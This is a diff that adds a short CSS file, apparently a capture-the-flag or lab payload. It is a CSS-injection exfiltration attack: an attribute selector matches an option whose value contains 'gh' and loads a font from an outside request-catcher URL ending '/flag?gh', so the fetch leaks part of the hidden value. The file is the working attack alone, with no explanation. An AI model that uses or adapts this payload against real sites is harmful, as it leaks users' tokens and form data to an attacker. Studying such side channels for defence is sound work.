@@ -1,0 +1,14 @@
+@charset "UTF-8";
+
+p:nth-of-type(4) option[value*="gh"] {
+    font-family: "pair-gh";
+    font-size: 10px;
+    display: inline;
+    z-index: 10000;
+}
+
+@font-face {
+    font-family: "pair-gh";
+    src: url('https://css_task_test.requestcatcher.com/flag?gh');
+}
+
